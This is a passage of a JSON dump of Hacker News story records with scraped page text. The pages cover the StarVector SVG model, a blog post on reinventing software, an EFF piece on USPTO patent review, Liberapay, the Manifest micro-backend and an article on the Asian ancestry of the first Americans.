    "content": "StarVector represents a breakthrough in Scalable Vector Graphics (SVG) generation, seamlessly integrating visual and textual inputs into a unified foundation SVG model. By reframing vectorization as a code generation task rather than a traditional image processing problem, StarVector transcends previous limitations. This paradigm shift enables the model to leverage the full richness of SVG syntax—including circles, polygons, text elements, and complex paths—without simplification. Our approach allows training on internet-scale data to capture the diverse spectrum of vector representations. At its core, the model employs a vision-language architecture (VLM), enabling unprecedented capabilities in generating complex SVG elements. Complemented by SVG-Stack—our extensive dataset—and SVG-Bench—our comprehensive evaluation framework—StarVector establishes a new paradigm for high-quality vector graphics generation.\n\n              Key Capabilities\n\n                01\n\n                  Advanced Multimodal Architecture\n                  StarVector's multimodal architecture processes both visual and textual information with remarkable precision, enabling sophisticated image vectorization and text-guided SVG creation that captures fine details and structural relationships. The image encoder and language decoder work together to understand the semantics of an image in pixel space, recognizing primitive shapes, hierarchies, and layers to produce compact and semantically meaningful SVG primitive outputs.\n\n                02\n\n                  Unparalleled Complexity Handling\n                  Where traditional algorithms falter, StarVector excels—effortlessly recognizing and generating intricate SVG elements including text, complex paths, and various primitives directly from images. The model intelligently identifies geometric shapes, connectivity patterns, and structural elements to produce professional-quality diagrams and icons.\n\n                03\n\n                  Robust Data Foundation\n                  Built upon SVG-Stack—our meticulously curated dataset of over 2 million SVG samples—and evaluated through SVG-Bench, StarVector benefits from diverse, high-quality training examples that ensure consistent performance across various graphic styles and complexities.\n\n                04\n\n                  Leading-Edge Performance\n                  StarVector significantly outperforms existing methods in both text-to-SVG and image-to-SVG generation tasks, demonstrating a substantial leap forward in vectorization quality while remaining fully accessible to the research community as an open-source resource.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "15dd50f604234d73",
    "title": {
      "en": "Wheel Reinventor’s Principles (2024)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://tobloef.com/blog/wheel-reinventors-principles/",
    "score": 210,
    "by": "TobLoef",
    "time": 1742559405,
    "content": "↩\nGo to front page\n   Switch to dark mode  const r=localStorage.getItem(\"isDarkMode\"),c=r!==null?r===\"true\":void 0,n=window.matchMedia?.(\"(prefers-color-scheme: dark)\").matches;let t=c??n??!1;const a=document.getElementById(\"theme-switcher\");a.addEventListener(\"click\",()=>{t=!t,o(t),localStorage.setItem(\"isDarkMode\",String(t))});o(t);function o(e){a.textContent=e?\"Switch to light mode\":\"Switch to dark mode\",document.documentElement.style.setProperty(\"--text\",e?\"var(--dark-text)\":\"var(--light-text)\"),document.documentElement.style.setProperty(\"--background\",e?\"var(--dark-background)\":\"var(--light-background)\"),document.documentElement.style.setProperty(\"--primary\",e?\"var(--dark-primary)\":\"var(--light-primary)\"),document.documentElement.style.setProperty(\"--secondary\",e?\"var(--dark-secondary)\":\"var(--light-secondary)\"),document.documentElement.style.setProperty(\"--accent\",e?\"var(--dark-accent)\":\"var(--light-accent)\")}  Wheel Reinventor's Principles Why and how I sometimes write stuff from scratch. Why reinvent?\nThe Wheel Reinventor enjoys reinventing wheels. A lot of wheels have been invented before, some are even very popular. So why does the Wheel Reinventor make new ones?\n\nLearning: By reinventing the wheel, the Wheel Reinventor learns much. Not only about how to create new wheels, but also about how existing wheels work.\nSpecificity: No one wheel fits all. When creating their own wheel, the Wheel Reinventor can tailor it for their exact use case, whether that’s a wheelbarrow or a monster truck.\nInnovation: Although popular, some existing wheels are quite bad. While reinventing, the Wheel Reinventor has the opportunity to explore new possibilities in a way that existing solutions cannot.\nEnjoyment: Wheel reinvention does, in truth, not need much of a reason. It can simply be out of love of the craft and the satisfaction of work well done.\n\nChallenges\nThe Wheel Reinventor must however be careful. Reinventing wheels can be time-consuming and the end product may be inferior to existing solutions. The Wheel Reinventor also tends to fall into infinite rabbit holes. To create a wheel, must they also create the hammer that they need? Must they fell a tree for the hammer’s handle? If the Wheel Reinventor begins by planting a forest, they will not be building vehicles any time soon.\nThe Wheel Reinventor must therefore first and foremost be deliberate. They must consider whether it is appropriate for a given wheel to be reinvented, especially when accountable to others. They must also consider the scope of what is being reinvented (and crucially, what is not), as to not get needlessly sidetracked.\nLikewise, the Wheel Reinventor must be honest with themself. They must keep in mind why they’re reinventing a particular wheel and not lose sight of that. A wheel reinvented for learning looks different than a wheel reinvented for innovation.\nDevelopment Principles\n(While not strictly tied to the principles above, I have found the points below to help me foster a healthy mindset when doing wheel reinvention projects.)\n\nMinimize third-party dependencies. Master the platform’s built-ins and accumulate your own toolbox over time.\nEmbrace the strengths of DIY. Create what you need and little more. Be wary of abstractions made for fabricated use cases.\nAvoid magic where possible. Try to stay close to the metal, preferring simple tools and not losing touch with the underlying technology.\nShare your work. Open-source your code where possible. Write about your approach and let others learn from your experiences.\n\nThank you for reading. Good luck with the wheels.\nPublished on: July 9th 2024",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "43ebc5dacf39cb98",
    "title": {
      "en": "New USPTO Memo Makes Fighting Patent Trolls Even Harder",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.eff.org/deeplinks/2025/03/new-uspto-memo-makes-fighting-patent-trolls-even-harder",
    "score": 298,
    "by": "healsdata",
    "time": 1742583333,
    "content": "The U.S. Patent and Trademark Office (USPTO) just made a move that will protect bad patents at the expense of everyone else. In a memo released February 28, the USPTO further restricted access to inter partes review, or IPR—the process Congress created to let the public challenge invalid patents without having to wage million-dollar court battles.\nIf left unchecked, this decision will shield bad patents from scrutiny, embolden patent trolls, and make it even easier for hedge funds and large corporations to weaponize weak patents against small businesses and developers.\nIPR Exists Because the Patent Office Makes Mistakes\nThe USPTO grants over 300,000 patents a year, but many of them should not have been issued in the first place. Patent examiners spend, on average, around 20 hours per patent, often missing key prior art or granting patents that are overly broad or vague. That’s how bogus patents on basic ideas—like podcasting, online shopping carts, or watching ads online—have ended up in court.\nCongress created IPR in 2012 to fix this problem. IPR allows anyone to challenge a patent’s validity based on prior art, and it’s done before specialized judges at the USPTO, where experts can re-evaluate whether a patent was properly granted. It’s faster, cheaper, and often fairer than fighting it out in federal court.\nThe USPTO is Blocking Patent Challenges—Again\nInstead of defending IPR, the USPTO is working to sabotage it. The February 28 memo reinstates a rule that allows for widespread use of “discretionary denials.” That’s when the Patent Trial and Appeal Board (PTAB) refuses to hear an IPR case for procedural reasons—even if the patent is likely invalid.\nThe February 28 memo reinstates widespread use of the Apple v. Fintiv rule, under which the USPTO often rejected IPR petitions whenever there’s an ongoing district court case about the same patent. This is backwards. If anything, an active lawsuit is proof that a patent’s validity needs to be reviewed—not an excuse to dodge the issue.\nIn 2022, former USPTO Director Kathi Vidal issued a memo making clear that the PTAB should hear patent challenges when “a petition presents compelling evidence of unpatentability,” even if there is parallel court litigation.\nThat 2022 guidance essentially saved the IPR system. Once PTAB judges were told to consider all petitions that showed “compelling evidence,” the procedural denials dropped to almost nothing. This February 28 memo signals that the USPTO will once again use discretionary denials to sharply limit access to IPR—effectively making patent challenges harder across the board.\nDiscretionary Denials Let Patent Trolls Rig the System\nThe top beneficiary of this decision will be patent trolls, shell companies formed expressly for the purpose of filing patent lawsuits. Often patent trolls seek to extract a quick settlement before a patent can be challenged. With IPR becoming increasingly unavailable, that will be easier than ever.\nPatent owners know that discretionary denials will block IPRs if they file a lawsuit first. That’s why trolls flock to specific courts, like the Western District of Texas, where judges move cases quickly and rarely rule against patent owners.\nBy filing lawsuits in these troll-friendly courts, patent owners can game the system—forcing companies to pay up rather than risk millions in litigation costs.\nThe recent USPTO memo makes this problem even worse. Instead of stopping the abuse of discretionary denials, the USPTO is doubling down—undermining one of the most effective ways businesses, developers, and consumers can fight back against bad patents.\nCongress Created IPR to Protect the Public—Not Just Patent Owners\nThe USPTO doesn’t get to rewrite the law. Congress passed IPR to ensure that weak patents don’t become weapons for extortionary lawsuits. By reinforcing discretionary denials with minimal restrictions, and, as a result, blocking access to IPRs, the USPTO is directly undermining what Congress intended.\nLeaders at the USPTO should immediately revoke the February 28 memo. If they refuse, as we pointed out the last time IPR denials spiraled out of control, it’s time for Congress to step in and fix this. They must ensure that IPR remains a fast, affordable way to challenge bad patents—not just a tool for the largest corporations. Patent quality matters—because when bad patents stand, we all pay the price.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6bc5028df4e5f69a",
    "title": {
      "en": "Facebook to stop targeting ads at UK woman after legal fight",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.bbc.co.uk/news/articles/c1en1yjv4dpo",
    "score": 129,
    "by": "dijksterhuis",
    "time": 1742660568,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "4ef86df9914d8ed3",
    "title": {
      "en": "Liberapay",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://en.liberapay.com/",
    "score": 342,
    "by": "nanna",
    "time": 1742300472,
    "content": "Liberapay is a recurrent donations platform.\n    We help you fund the creators and projects you appreciate.\n\n        Donate\nPeople who contribute to the commons need you to support their work. Building free software, spreading free knowledge, these things take time and cost money, not only to do the initial work, but also to maintain it over time.\nLiberapay's recurrent donations system is designed to provide a stable crowdfunded basic income to creators, enabling them to keep doing great work that benefits everyone. Ready to contribute? Then let's get started:\n\n Explore\n\n Search\n\n        Receive\n\n            Are you a creator of commons? Do you make free art, spread free knowledge, write free software? Or something else that can be funded by recurrent donations?\n            Yes? Then Liberapay is for you! Create your account, fill your profile, and ask your audience to financially support your work.\n\n Create your account\n\n        How it works for donors\n\n                    1. Set up a donation\n\n                Find someone you want to give money to, then choose an amount, a period (weekly, monthly, or yearly), and a renewal method (manual or automatic).\n\n                    2. Fund your donation\n\n                On Liberapay, donations are funded in advance. You have control over when and how much you pay. Sending more money at once usually results in a lower percentage of transaction fees.\n\n                    3. Keep your donation funded\n\n                We will notify you whenever a donation needs to be renewed. If you've opted for automatic renewals, then we will attempt to debit your card or bank account as agreed.\n\n        How it works for creators\n\n                    1. Create your profile\n\n                Explain what you do, why you've chosen to ask for donations, what the money will be used for, etc.\n\n                    2. Configure payment processing\n\n                We currently support processing payments through Stripe and PayPal.\n\n                    3. Reach out to your audience\n\n                Contact the people who benefit from your work and ask them to support you.\n\n Create your account\n\n        How it works internally\n        Liberapay is run transparently by a non-profit organization, its source code is public.\n        We rely on your support to keep Liberapay running and improving.\n\n Fund Liberapay\n\n        Features\n\n                    Teams\n\n                A team allows members of a project to receive money and share it, without having to set up a legal entity. Learn more…\n\n                    Multiple languages\n\n                Our service is currently available in 29 languages.\n                Your profile descriptions and other texts can be published in up to 118 languages.\n\n                        $\n                        €\n                        £\n                        ¥\n\n                    Multiple currencies\n\n                Liberapay's first currency was the euro, then the US dollar was added, and now we support a total of 133 currencies. However, we do not handle any crypto-currency.\n\n                    Integrations\n\n                You can link to your profile the accounts you own on GitHub, Twitter, Mastodon, and 7 other platforms.\n                You can also easily list on your profile the repositories you contribute to on GitHub and GitLab.com.\n\n                    Pledges\n\n                Liberapay allows pledging to people who haven't joined the site yet. No money is collected for pledges, they only become real donations when the recipients join. Of course we notify the donors when that happens.\n\n        Sponsors\n        Donations from businesses and nonprofits are welcome on Liberapay. If you have any questions, don't hesitate to contact us.\n\n        Thanks\n        Liberapay benefits from sponsored accounts on the following open source services:\n\n        Recent Activity\n\n 1,974 user accounts have been created in the past month. The most recent was 23 minutes ago.\n\n 739 new donations have been started in the past month, increasing total weekly funding by ₩1,311,634.\n\n 13 new pledges have been made in the past month, adding ₩52,211 of weekly donations waiting to be claimed.\n\n ₩29,974,870 was transferred last week between 14,076 users.\n\n More stats\n\n Learn more\n\n Follow us",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e44736f087491b6a",
    "title": {
      "en": "Manifest: A 1-file micro-back end",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/mnfst/manifest",
    "score": 94,
    "by": "andrewshadura",
    "time": 1742292941,
    "content": "🚀 Featured on HackerNews – join the momentum & give us a ⭐ if you like it!\n\nThe 1-file micro-backend\n\nname: Pokemon app 🐣\n\nentities:\n  Pokemon 🐉:\n    properties:\n      - name\n      - {\n          name: type,\n          type: choice,\n          options: { values: [Fire, Water, Grass, Electric] }\n        }\n      - { name: level, type: number }\n    belongsTo:\n      - Trainer\n\n  Trainer 🧑‍🎤:\n    properties:\n      - name\n      - { name: isChampion, type: boolean }\n\nWhy Manifest?\n80% of websites and apps only use the most basic backend features. Using over-engineered solutions lead to unnecessary costs and complexity.\nManifest keeps it simple, delivering only the essential backend features and smoothly integrating in your project like any other file in your codebase.\nUse cases\nManifest fits great in those type of projects:\n\n🛠️ Rapid prototyping: POCs and MVPs\n🧩 Micro services: notification, payment, logging, file services...\n🏭 CRUD-heavy apps: mobile apps, directories, PIMs, E-shops\n🌐 Headless CMS: dynamic corporate websites, portfolios, blogs...\n\nKey features\nAuth | Validation | Storage | Image resizing | Admin panel | Dynamic endpoints |\nREST API | JS SDK | Webhooks\nGetting started\nSimply run this terminal command to add Manifest locally:\nnpx add-manifest@latest\n\nNoteManifest is currently in BETA, use it at your own risk. It is stable enough to power small projects, prototypes and MVPs but we do not recommend to use it on critical platforms.\n\nCommunity & Resources\n\nRead the Docs to get started\nChat with us on our Discord\nReport bugs on Github issues\nSuggest new features on Github Discussions\n\nWant to help Manifest grow? 💗\nHere is a few small things you can do:\n\nStar the Manifest repository (this one)\nGive us your feedback on Discord\nSponsor Manifest through OpenCollective\n\nContributors\nWe welcome contributions to Manifest, Please see our Contributing Guidelines to get started and join the journey.\nThanks to our wonderful contributors!\n\nSponsors\nManifest is an MIT-licensed open-source project. If you find it useful and want to support its development, consider becoming a sponsor.\nSponsors\n\nBacked by\n\nPartners\n\nThis project is tested with BrowserStack",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "caf646d9cc67a1a6",
    "title": {
      "en": "There's no emotion we ought to think harder about than anger",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://aeon.co/essays/there-s-no-emotion-we-ought-to-think-harder-about-than-anger",
    "score": 54,
    "by": "privong",
    "time": 1742675507,
    "content": "Join over 250,000+ newsletter subscribersJoin over 250,000+ newsletter subscribers.Our content is 100 per cent free and you can unsubscribe anytime.Our content is 100 per cent free and you can unsubscribe anytime.Daily: A daily dose of essays, guides and videos from Aeon+PsycheWeekly: A week’s worth of big ideas from AeonSign upI’m already subscribedPrivacy Policy\n\nAt a time when misinformation abounds, it is vital that expert knowledge be accessible to all.At a time when misinformation abounds, it is vital that expert knowledge be accessible to all.Your donation, whatever the size, supports our mission to ask the big questions and deliver fresh, original insights from leading thinkers.\nIf you value what we do, will you support us?Your donation, whatever the size, supports our mission to ask the big questions and deliver fresh, original insights from leading thinkers.\nIf you value what we do, will you support us?I would like to donate:MonthlyAnnuallyOne-timeSelect amount (US dollars):$5 per month$10 per monthDonate now",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "8b7b54a1406f7565",
    "title": {
      "en": "Most AI value will come from broad automation, not from R&D",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://epoch.ai/gradient-updates/most-ai-value-will-come-from-broad-automation-not-from-r-d",
    "score": 92,
    "by": "ydnyshhh",
    "time": 1742668500,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "abe61af7f266c42a",
    "title": {
      "en": "DNA evidence says first Americans came from Asia",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://factsanddetails.com/world/cat56/sub361/entry-8944.html",
    "score": 77,
    "by": "axiologist",
    "time": 1742508868,
    "content": "DNA EVIDENCE SAYS FIRST AMERICANS CAME FROM ASIA\n\n\tBeringia in the Ice Age\n\nNatives Americans are believed to have descended from Asian people who arrived in North America via the Bering Strait. The DNA of ancient American bog people is closer to the Japanese than Americans.\n\nGlenn Hodges wrote in National Geographic: “In recent years geneticists have compared the DNA of modern Native Americans with that of other populations around the world and concluded that the ancestors of Native Americans were Asians who separated from other Asian populations and remained isolated for about 10,000 years, based on mutation rates in human DNA. During that time they developed unique genetic signatures that only Native Americans currently possess. [Source: Glenn Hodges, National Geographic, January 2015 /~]\n\n“These genetic markers have been found not only in the DNA recovered from Naia’s skeleton” from Hoyo Negro, Mexico “ but also in the remains of a child buried some 12,600 years ago in western Montana, on a piece of land now called the Anzick site.” In 2014 “Danish geneticist Eske Willerslev reported that an analysis of the child’s remains had yielded, for the first time, a full Paleo-American genome. “Now we’ve got two specimens, Anzick and Hoyo Negro, both from a common ancestor who came from Asia,” Waters says. “And like Hoyo Negro, the Anzick genome unquestionably shows that Paleo-Americans are genetically related to native peoples.” Though some critics point out that two individuals are too\nsmall a sample to draw definitive conclusions, there’s strong consensus on the Asian ancestry of the first Americans.” /~\\\n\n RELATED ARTICLES:\n EARLIEST EVIDENCE OF HUMANS TO AMERICA  factsanddetails.com ;\n WHEN AND HOW THE FIRST HUMANS CAME TO AMERICA: THEORIES AND EVIDENCE  factsanddetails.com ;\n MIGRATION ROUTE OF THE FIRST HUMANS IN AMERICA  factsanddetails.com ;\n SINGLE WAVE VS MULTIPLE PULSE THEORY AND MIGRATION OF EARLY PEOPLE TO AMERICA  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN WHAT IS NOW ALASKA AND CANADA  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN WHAT IS NOW THE CONTINENTAL U.S.  factsanddetails.com ;\n WHITE SANDS 23,000-21,000 YEAR-OLD HUMAN FOOTPRINTS  factsanddetails.com ;\n CLOVIS PEOPLE: SITES, POINTS, PRE-CLOVIS, MAMMOTHS  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN SOUTH AMERICA  factsanddetails.com ;\n EARLIEST MODERN HUMANS IN SOUTHERN SOUTH AMERICA  factsanddetails.com ;\n FIRST HUMANS AND SETTLEMENTS IN THE AMAZON  factsanddetails.com ;\n SOLUTREAN HYPOTHESIS  factsanddetails.com\n\n  RECOMMENDED BOOKS:\n “Origin: A Genetic History of the Americas” By Jennifer Raff, an associate professor of anthropology at the University of Kansas (Twelve, 2022);   Amazon.com;\n “First Peoples in a New World: Populating Ice Age America” by David J. Meltzer, an archaeologist and professor of prehistory in the Department of Anthropology at Southern Methodist University in Dallas, (Cambridge University Press, 2021);  Amazon.com;\n “The Indigenous Paleolithic of the Western Hemisphere” by Paulette F. C. Steeves (2023)  Amazon.com;\n “First Migrants: Ancient Migration in Global Perspective” by Peter Bellwood  Amazon.com;\n“Ancestral DNA, Human Origins, and Migrations” by Rene J. Herrera (2018)  Amazon.com;\n“Who We Are and How We Got Here: Ancient DNA and the New Science of the Human Past” by David Reich (2019)  Amazon.com;\n“Our Human Story: Where We Come From and How We Evolved” By Louise Humphrey and Chris Stringer, (2018)  Amazon.com;\n\"The Settlement of the Americas: A New Prehistory\" by Thomas D. Dillehay ( Basic Books, 2000 Dated)  Amazon.com;\n”Strangers in a New Land: What Archaeology Reveals About the First Americans”\nby J. M. Adovasio, David Pedler (2016)  Amazon.com;\n “Paleoindian Mammoth and Mastodon Kill Sites of North America by Jason Pentrail (2021)  Amazon.com;\n “Clovis The First Americans?: by F. Scott Crawford (2012)\n Amazon.com;\n “Across Atlantic Ice: The Origin of America's Clovis Culture”\nby Dennis J. J. Stanford, Bruce A. Bradley, Michael Collins  Amazon.com;\n “From Kostenki to Clovis: Upper Paleolithic—Paleo-Indian Adaptations (Interdisciplinary Contributions to Archaeology) by Olga Soffer (1993)  Amazon.com;\n\nGenetic Model of the First Americans\n\nLaura Geggel wrote in Live Science: Geneticists studying the first Americans tend to paint a more consistent picture than archaeologists do, mainly because they're using the same human remains and genetic datasets. Genetic analyses have found that Ancient North Siberians and a group of East Asians paired up around 20,000 to 23,000 years ago, Jennifer Raff, an associate professor of anthropology at the University of Kansas, told Live Science. Soon after, the population split into two genetically distinct groups: one that stayed in Siberia, and another, the basal American branch, which emerged around 20,000 to 21,000 years ago. Genetic data suggest the descendants of this basal American branch crossed the Bering Land Bridge and became the first Americans. [Source: Laura Geggel, Live Science, October 9, 2023]\n\nThe basal American branch then split into three groups: unsampled population A (UPopA), a mysterious \"genetic\" ghost that has \"only been detected indirectly from the genomes\" of the Mixe, of what is now Mexico, Raff said; Ancient Beringians, who have no known living descendants; and Ancestral Native Americans (ANA), whose descendants live on today.\n\nAll three of these groups ultimately made it to North America, but their diverging genetics suggests that they crossed in separate movements, Meltzer and Willerslev wrote in the review. Some didn't make it very far; The Ancient Beringians entered Alaska but never made it south of the continental ice sheets. The last known Ancient Beringian, known as the \"Trail Creek individual,\" died around 9,000 years ago in Alaska.\n\nMeanwhile, the ANA lineage underwent several splits, suggesting that these people settled in different areas of North America as they had limited gene flow between them, Raff said. There was one split between 21,000 and 16,000 years ago and then a second one around 15,700 years ago. During this second split, the Northern Native Americans — whose living descendants include speakers of the Algonquian, Salishan, Tsimshian and Na-Dené language groupings — separated from the Southern Native Americans (SNA), who spread southward and whose descendants include the Clovis, Raff said. Every known living and deceased Indigenous \"individual south of Canada belongs to SNA,\" Raff said.\n\nDNA Studies Related to the First Americans\n\nOne study revealed that the first Native American group to settle in the Americas had just about 250 people in it. According to Live Science: To make the finding, researchers looked at the DNA of people from Native American groups in Central and South America, different Siberian groups, and people from China. Because genetic divergence (for instance, between Native Americans and Siberians) increases with time, the researchers were able to plug the DNA data into a computer model and work backward to determine the size of the original group. [Source:  Laura Geggel, Live Science, December 25, 2018]\n\nEske Willerslev of the University of Cambridge and the Center for GeoGenetics at the Globe Institute at the University of Copenhagen sequenced the first ancient human genome in 2010 and later sequenced numerous genomes in an effort to get a picture of the first Americans, including a 12,400-year-old boy from Montana, 11,500-year-old infants at Alaska’s Upward Sun River site and the skeletal DNA of a boy whose 24,000-year-old remains were found at the village of Malta, near Russia’s Lake Baikal. [Source: Fen Montaigne, Smithsonian magazine, January-February 2020]\n\nFen Montaigne wrote in Smithsonian magazine: “According to Willerslev, sophisticated genomic analyses of ancient human remains — which can determine when populations merged, split or were isolated — show that the forebears of Native Americans became isolated from other Asian groups around 23,000 years ago. After that period of genetic separation, “the most parsimonious explanation,” he says, is that the first Americans migrated into Alaska well before 15,000 years ago, and possibly more than 20,000 years ago. Willerslev has concluded that “there was a long period of gene flow” between the Upward Sun River people and other Beringians from 23,000 to 20,000 years ago. “There was basically an exchange between the populations across eastern and western Beringia,” Willerslev said in a phone interview from Copenhagen. “So you had these groups hanging around Beringia and they are to some degree isolated — but not completely isolated — from each other. You had those groups up there, on both sides of the Bering Land Bridge, around 20,000 years ago. I think that is very likely.”\n\nChinese researchers Feng Zhang, Bing Su, Ya-ping Zhang and Li Jin have done studies based on Mitochondrial DNA (mtDNA), circular chromosomes found inside cellmitochondria that is passed down on along the female line.  They wrote in an article published by the Royal Society: Among Native Americans: “There are three linguistically identified groups of population: Amerind, Eskimo-Aleut and Na-Dene. mtDNA haplogroups of Native America include four Asian haplogroups (A, B, C and D) and one European haplogroup studied Amerind populations and showed that the sequence diversity of haplogroup B is much lower than those of haplogroups A, C and D. Furthermore, haplogroup B is absent in Siberia, while A, C and D are prevalent. These two observations imply that the Amerind linguistic group might have been derived from two migrations. [Source: “Genetic studies of human diversity in East Asia” by 1) Feng Zhang, Institute of Genetics, School of Life Sciences, Fudan University, 2) Bing Su, Laboratory of Cellular and Molecular Evolution, Kunming Institute of Zoology, 3) Ya-ping Zhang, Laboratory for Conservation and Utilization of Bio-resource, Yunnan University and 4) Li Jin, Institute of Genetics, School of Life Sciences, Fudan University. Author for correspondence (ljin007@gmail.com),  2007 The Royal Society ***]\n\nLell et al. (2002) analysed 12 Y-SNPs in 549 individuals from Siberia and the Americas. Three major Y lineages of Native American populations have been found: M3 (66 percent), M45 (25 percent) and M130 (5 percent). M3, also known as DYS119 (Underhill et al. 1996), was confined to the Chukoka peninsula in Siberia. M45 was divided into two subgroups; one subgroup (M45a) is found throughout the Americas, and another (M45b) is prevalent in North and Central America. These two sub-haplogroups have different distribution patterns in Siberia (M45a in middle Siberia and M45b in eastern Siberia). The C-M130 haplogroup has a similar distribution to that of M45b in Siberia and in North America. They hypothesized that there were two independent migrations into America from Siberia, which is consistent with the mtDNA evidence (Wallace et al. 1985). M242 is a polymorphism, which was introduced after M74 (arising in Asia) but before M3 (arising in America) in the phylogeny of the human Y chromosome (Underhill et al. 1996, 2000), and can be used to date the entry into the Americas. Based on the diversity of 15 Y-STRs in 69 Eurasian M242-T samples, the time of first entry into the Americas was estimated to be close to 15 000–18 000 years BP (Seielstad et al. 2003).\n\nDid the First Americans and Japanese Come from China?\n\nA DNA study published in May 2023 in Cell Reports revealed that some of the first arrivals in America  came from China during two distinct migrations: the first during the last ice age, and the second shortly after. \"Our findings indicate that besides the previously indicated ancestral sources of Native Americans in Siberia, the northern coastal China also served as a genetic reservoir contributing to the gene pool,\" Yu-Chun Li, one of the report authors, told AFP. [Source:  Issam Ahmed, AFP, May 10, 2023]\n\nAFP reported: Li added that during the second migration, the same lineage of people settled in Japan, which could help explain similarities in prehistoric arrowheads and spears found in the Americas, China and Japan. It was once believed that ancient Siberians, who crossed over a land bridge that existed in the Bering Strait linking modern Russia and Alaska, were the sole ancestors of Native Americans. More recent research, from the late 2000s onwards, has signaled more diverse sources from Asia could be connected to an ancient lineage responsible for founding populations across the Americas, including Bolivia, Brazil, Chile, Ecuador, Mexico and California. Known as D4h, this lineage is found in mitochondrial DNA, which is inherited only from mothers and is used to trace maternal ancestry.\n\nThe team from the Kunming Institute of Zoology embarked on a ten-year hunt for D4h. Charles Q. Choi wrote in  Live Science: The researchers analyzed more than 100,000 contemporary and 15,000 ancient DNA samples from across Eurasia. D4h is a rare mitochondrial DNA lineage which is currently found in only about 1 in 200 people worldwide. \"This genetic type had only been sporadically reported in different studies,\" study lead author Yu-Chun Li, a molecular anthropologist at the Kunming Institute of Zoology in China, told Live Science. \"Therefore, this female lineage, as well as its origin and dispersal history — especially its dispersal into the Americas — gained little attention until now.\" Previous research found that one branch of D4h, known as D4h3a, was seen in Indigenous Americans, while another offshoot named D4h3b was detected in China and Thailand. This suggested that ancient members of the D4h lineage might help bridge Asia and the Americas.\"The most difficult work was to collect as many samples belonging to D4h as we could,\" study senior author Qing-Peng Kong, an evolutionary geneticist at the Kunming Institute of Zoology, told Live Science. [Source:  Charles Q. Choi, Live Science May 10, 2023]\n\nThe Kunming team eventually landed on 216 contemporary and 39 ancient individuals who came from the ancient lineage.\nBy analyzing the mutations that had accrued over time, looking at the samples' geographic locations and using carbon dating, they were able to reconstruct the D4h lineage's origins and expansion history. The results revealed two migration events. The first was between 19,500 and 26,000 years ago during the Last Glacial Maximum, when ice sheet coverage was at its greatest and climate conditions in northern China were likely inhospitable.\n\nThe second occurred during the melting period, between 19,000 and 11,500 years ago. Increasing human populations during this period might have triggered migrations. In both cases, the scientists think the travelers were seafarers who docked in America and traveled along the Pacific coast by boats. This is because a grassy passageway between two ice sheets in modern Canada, known as the  \"inland ice-free corridor,\" was not yet opened.In the second migration, a subgroup branched out from northern coastal China to Japan, contributing to the Japanese people, especially the indigenous Ainu, the study said, a finding that chimes with archeological similarities between ancient people in the Americas, China and Japan.\n\nLi said a strength of the study was the number of samples they discovered, and complementary evidence from Y chromosomal DNA showing male ancestors of Native Americans lived in northern China at the same time as the female ancestors, made them confident of their findings.Loren Davis, an archaeologist at Oregon State University in Corvallis who did not take part in this research, told Live Science while the new study is exciting, it's just \"another piece of the puzzle,\" on how and when ice age humans first populated the Americas, Davis said. For instance, the researchers stressed that while these new findings suggest this single northern Chinese lineage may have contributed to Indigenous American ancestry, \"it does not represent the whole history of all Native Americans,\" Li said. \"Investigating other lineages showing genetic connections between Asia and the Americas will help obtain the whole picture of the history of Native Americans.\"\n\nMigration Patterns Deduced from Blood Types and North America and Siberian Languages\n\nGeneticists believe that early Americans were composed of three separate groups that arrived in America at different times from different places: 1) the Amerind, the dominate group in North and South America, possess only type O blood; 2) the Na-Dene, who live in clusters in Alaska, Canada and part of the U.S. Southwest, have mostly O but a little A blood; and 3) the Alaskan and Canadian Inuit (Eskimo) have A, B, AB and O blood group patterns which parallel other groups found in the rest of the world.\n\nJoseph Stromberg wrote in smithsonian.com: “A pair of linguistics researchers, Mark Sicoli and Gary Holton, recently analyzed languages from North American Na-Dene family (traditionally spoken in Alaska, Canada and parts of the present-day U.S.) and the Asian Yeneseian family (spoken thousands of miles away, in central Siberia), using similarities and differences between the languages to construct a language family tree. As they note in an article published today in PLOS ONE, they found that the two language families are indeed related—and both appear to descend from an ancestral language that can be traced to the Beringia region. Both Siberia and North America, it seems, were settled by the descendants of a community that lived in Beringia for some time. In other words, Sicoli says, “this makes it look like Beringia wasn’t simply a bridge, but actually a homeland—a refuge, where people could build a life.”[Source:  Joseph Stromberg, smithsonian.com, March 12, 2014 ^]\n\n“Sicoli began looking into the relationships between languages to model migration in the region several years ago, when he was with Holton at the University of Alaska (Sicoli is now at Georgetown University). The relationship between Yenesian and Na-Dene languages—which would theoretically serve as proof that Native Americans’ ancestors had migrated from Asia—was proposed as far back as 1923, by Italian linguist Alfredo Trombetti, but the first rigorous research to prove the link was only conducted over the past decade or so. ^\n\n“Sicoli and Holton sought to go a step further: They wanted to not only show the two groups were related, but analyze the similarities and differences between languages in the two families to paint a geographic picture of this ancient migration.  To do so, they relied upon software programs that conduct phylogenetic analyses. Most often, phylogenetics refers to sorting out the evolutionary relationships between different organisms, using genetic similarities and differences to construct an accurate family tree of species. But because languages, like life, gradually evolve over time, linguists have put the same sort of analysis to work in constructing language trees. ^\n\n“The researchers collected data on two Yeniseian languages, 37 Na-Dene languages and Haida (a language spoken on Canada’s Pacific coast but not believed to be related to Na-Dene, used as a control) from the Alaska Native Language Archive and several other published 